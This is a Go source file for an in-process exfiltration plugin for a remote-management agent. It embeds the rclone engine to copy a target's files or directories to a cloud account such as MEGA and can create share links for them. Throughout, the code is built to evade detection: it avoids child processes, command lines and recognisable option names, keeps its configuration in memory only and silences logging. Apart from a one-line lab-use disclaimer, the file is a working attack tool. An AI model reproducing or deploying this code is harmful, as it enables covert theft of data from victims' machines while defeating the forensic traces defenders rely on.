// Diskless in-process rclone exfil plugin for the Minimal-RMM Go agent.
//
// The plugin embeds the rclone engine as a Go library, so exfiltration
// runs inside the agent process: there is no rclone.exe child process,
// no command line, no rclone CLI option names, and no config file on
// the target. It is loaded through the agent's diskless PE loader
// (__PE_LOAD__) and speaks the plugin ABI:
//
//	int Run(const char *input, char *output, int outputCap)
//
// The input is a JSON job with the plugin's own option names — none of
// them are rclone CLI flags:
//
//	{
//	  "source":      "C:\\labs\\loot.zip",  // local file or directory
//	  "account":     "vault",               // remote section name (default "vault")
//	  "backend":     "mega",                // rclone backend type
//	  "target":      "case42/",             // destination path inside the remote
//	  "settings":    {"pass": "..."},       // backend options; rclone-obscured values are revealed
//	  "make_link":   true,                  // request a share link for single files
//	  "link_hours":  18,                    // share link expiry (0 = backend default)
//	  "max_minutes": 30                     // transfer deadline (default 30, cap 240)
//	}
//
// The output is a JSON result shaped like the agent's cloud upload
// results (remote_path, profile, backend, success, dest, link, error).
// Authorized lab use only.
package main

/*
#include <stdlib.h>
*/
import "C"

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"log"
	"os"
	"path/filepath"
	"sync"
	"time"
	"unsafe"

	// Register every rclone cloud backend so the plugin matches the
	// feature set of the rclone binary. To slim the image, replace this
	// with the specific backends you need (e.g. backend/mega).
	_ "github.com/rclone/rclone/backend/all"
	"github.com/rclone/rclone/fs"
	"github.com/rclone/rclone/fs/config"
	"github.com/rclone/rclone/fs/config/obscure"
	"github.com/rclone/rclone/fs/operations"
	rsync "github.com/rclone/rclone/fs/sync"
)

// pluginOnce guards the rclone engine setup that must run before the
// first transfer: memory-only configuration (never a config file on
// disk) and silencing the default rclone stderr logging.
var pluginOnce sync.Once

// job is the plugin input schema. The JSON keys are deliberately not
// rclone option names; see the package comment for the full list.
type job struct {
	Source     string            `json:"source"`
	Account    string            `json:"account"`
	Backend    string            `json:"backend"`
	Target     string            `json:"target"`
	Settings   map[string]string `json:"settings"`
	MakeLink   bool              `json:"make_link"`
	LinkHours  int               `json:"link_hours"`
	MaxMinutes int               `json:"max_minutes"`
}

// result is the plugin output schema, mirroring the agent's cloud
// upload results so existing operator tooling can read it.
type result struct {
	RemotePath string `json:"remote_path"`
	Profile    string `json:"profile"`
	Backend    string `json:"backend"`
	Success    bool   `json:"success"`
	Dest       string `json:"dest"`
	Link       string `json:"link"`
	Error      string `json:"error"`
}

// Run implements the Go agent plugin ABI.
//
//export Run
func Run(input *C.char, output *C.char, outputCap C.int) C.int {
	text := ""
	if input != nil {
		text = C.GoString(input)
	}
	payload, err := exfil(text)
	if err != nil {
		payload = result{RemotePath: text, Success: false, Error: err.Error()}
	}
	writeOutput(output, outputCap, payload)
	if err != nil {
		return 1
	}
	return 0
}

func main() {}

// exfil configures the requested cloud account in memory, transfers the
// source file or directory into it, and returns the result payload.
func exfil(text string) (result, error) {
	var job job
	if err := json.Unmarshal([]byte(text), &job); err != nil {
		return result{}, err
	}
	if job.Source == "" {
		return result{}, errors.New("source is required")
	}
	if job.Backend == "" {
		return result{}, errors.New("backend is required")
	}
	if job.Account == "" {
		job.Account = "vault"
	}
	if job.MaxMinutes <= 0 {
		job.MaxMinutes = 30
	}
	if job.MaxMinutes > 240 {
		job.MaxMinutes = 240
	}
	if job.LinkHours < 0 {
		job.LinkHours = 0
	}
	pluginOnce.Do(initEngine)

	// Configure the account in memory. Setting the account type first
	// lets rclone validate the backend option names in Settings.
	config.FileSetValue(job.Account, "type", job.Backend)
	for key, value := range job.Settings {
		// Accept rclone-obscured values (e.g. from server profiles) and
		// plain ones: Reveal fails on plaintext, which is fine.
		if revealed, err := obscure.Reveal(value); err == nil {
			value = revealed
		}
		config.FileSetValue(job.Account, key, value)
	}

	info, statErr := os.Stat(job.Source)
	if statErr != nil {
		return result{}, statErr
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(job.MaxMinutes)*time.Minute)
	defer cancel()
	targetFs, err := fs.NewFs(ctx, job.Account+":"+job.Target)
	if err != nil {
		return result{}, err
	}

	out := result{
		RemotePath: job.Source,
		Profile:    job.Account,
		Backend:    job.Backend,
		Dest:       job.Target,
		Success:    false,
	}
	var link string
	if info.IsDir() {
		sourceFs, err := fs.NewFs(ctx, job.Source)
		if err != nil {
			return out, err
		}
		if err := rsync.Sync(ctx, targetFs, sourceFs, false); err != nil {
			return out, err
		}
	} else {
		sourceDir, sourceName := filepath.Split(filepath.Clean(job.Source))
		if sourceDir == "" {
			sourceDir = "."
		}
		sourceFs, err := fs.NewFs(ctx, sourceDir)
		if err != nil {
			return out, err
		}
		if err := operations.CopyFile(ctx, targetFs, sourceFs, sourceName, sourceName); err != nil {
			return out, err
		}
		if job.MakeLink {
			expiry := fs.Duration(time.Duration(job.LinkHours) * time.Hour)
			link, err = operations.PublicLink(ctx, targetFs, sourceName, expiry, false)
			if err != nil {
				// The transfer already succeeded; report the link failure
				// without failing the whole job.
				out.Error = "transfer ok, link failed: " + err.Error()
				out.Success = true
				return out, nil
			}
		}
	}
	out.Link = link
	out.Success = true
	return out, nil
}

// initEngine switches rclone to memory-only configuration and silences
// the default stderr logging. Nothing is ever written to the target disk.
func initEngine() {
	// Empty path means in-memory config: rclone neither reads nor writes
	// a config file.
	_ = config.SetConfigPath("")
	log.SetOutput(io.Discard)
	log.SetFlags(0)
}

// writeOutput stores a NUL-terminated JSON result in the output buffer.
func writeOutput(output *C.char, outputCap C.int, payload result) {
	if output == nil || outputCap <= 0 {
		return
	}
	data, err := json.Marshal(payload)
	if err != nil {
		data = []byte(`{"success":false,"error":"plugin result encoding failed"}`)
	}
	limit := int(outputCap) - 1
	if limit < 0 {
		return
	}
	if len(data) > limit {
		data = data[:limit]
	}
	window := unsafe.Slice((*byte)(unsafe.Pointer(output)), len(data))
	copy(window, data)
	*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(output)) + uintptr(len(data)))) = 0
}
